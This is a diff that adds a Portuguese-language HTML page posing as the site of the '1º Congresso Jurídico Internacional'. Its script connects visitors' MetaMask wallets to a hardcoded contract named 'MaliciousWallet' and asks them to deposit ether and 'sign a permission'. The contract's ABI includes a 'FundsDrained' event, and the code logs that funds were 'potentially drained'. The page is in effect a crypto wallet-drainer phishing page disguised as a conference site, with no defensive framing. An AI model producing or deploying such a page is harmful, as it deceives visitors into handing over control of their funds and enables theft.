@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <title>1º Congresso Jurídico Internacional</title>
+    <!-- Inclusão da biblioteca ethers.js -->
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
+    <style>
+        /* Estilos da página */
+        html, body {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+        button {
+            color: black;
+            margin: 5px;
+        }
+        .container {
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>1º Congresso Jurídico Internacional</h1>
+        <button onclick="conectarWallet()">Conectar Wallet</button>
+        <button id="btnDeposit" style="display:none;" onclick="depositarEther()">Depositar 0,002 Ether</button>
+        <button id="btnSignPermission" style="display:none;" onclick="signPermission()">Assinar Permissão</button>
+        <p id="status"></p>
+    </div>
+
+    <script>
+        const abiMaliciousWallet = [
+            {
+                "inputs": [],
+                "stateMutability": "nonpayable",
+                "type": "constructor"
+            },
+            {
+                "anonymous": false,
+                "inputs": [
+                    {
+                        "indexed": true,
+                        "internalType": "address",
+                        "name": "owner",
+                        "type": "address"
+                    },
+                    {
+                        "indexed": false,
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "FundsDrained",
+                "type": "event"
+            },
+            {
+                "anonymous": false,
+                "inputs": [
+                    {
+                        "indexed": true,
+                        "internalType": "address",
+                        "name": "user",
+                        "type": "address"
+                    }
+                ],
+                "name": "PermissionSigned",
+                "type": "event"
+            },
+            {
+                "inputs": [],
+                "name": "deposit",
+                "outputs": [],
+                "stateMutability": "payable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "getBalance",
+                "outputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "signPermission",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ];
+        
+        // Substitua pelo endereço do contrato implantado
+        const enderecoContratoMaliciousWallet = "0x8B1A41Aa5c6b626fD0a61B120F72E261bD16e84F"; 
+
+        let provider;
+        let signer;
+        let contrato;
+
+        async function conectarWallet() {
+            if (window.ethereum) {
+                try {
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    provider = new ethers.providers.Web3Provider(window.ethereum);
+                    signer = provider.getSigner();
+                    contrato = new ethers.Contract(enderecoContratoMaliciousWallet, abiMaliciousWallet, signer);
+
+                    document.getElementById('btnDeposit').style.display = 'block';
+                    document.getElementById('btnSignPermission').style.display = 'block';
+                    document.getElementById('status').textContent = "Wallet conectada: " + await signer.getAddress();
+                } catch (error) {
+                    console.error("Erro ao conectar a wallet:", error);
+                }
+            } else {
+                console.error("Por favor, instale o MetaMask!");
+            }
+        }
+
+        async function depositarEther() {
+            if (signer) {
+                try {
+                    const tx = await signer.sendTransaction({
+                        to: enderecoContratoMaliciousWallet,
+                        // Convertendo 0.002 ether para Wei
+                        value: ethers.utils.parseEther("0.002")
+                    });
+                    await tx.wait();
+                    console.log("0,002 ether depositados no contrato.");
+                } catch (error) {
+                    console.error("Erro ao depositar ether:", error);
+                }
+            } else {
+                console.error("Conexão com a wallet necessária.");
+            }
+        }
+
+        async function signPermission() {
+            if (signer && contrato) {
+                try {
+                    const tx = await contrato.signPermission();
+                    await tx.wait();
+                    console.log("Permissão assinada e fundos potencialmente drenados.");
+                } catch (error) {
+                    console.error("Erro ao assinar permissão:", error);
+                }
+            } else {
+                console.error("Conexão com a wallet necessária.");
+            }
+        }
+    </script>
+</body>
+</html>
